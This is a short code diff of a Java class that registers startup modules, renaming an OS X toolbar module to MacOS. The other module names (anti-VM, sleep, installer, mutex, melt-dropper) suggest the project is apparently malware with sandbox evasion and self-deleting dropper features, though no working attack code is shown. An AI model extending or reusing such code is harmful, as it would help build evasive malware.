@@ -14,7 +14,7 @@ public class StartupModules {
 		MODULES.add(AntiVMStartupModule.class);
 		MODULES.add(SleepStartupModule.class);
 		MODULES.add(InstallerStartupModule.class);
-		MODULES.add(OSXToolBarStartupModule.class);
+		MODULES.add(MacOSToolBarStartupModule.class);
 		MODULES.add(OperatingSystemCheckStartupModule.class);
 		MODULES.add(MutexStartupModule.class);
 		MODULES.add(MeltDropperStartupModule.class);
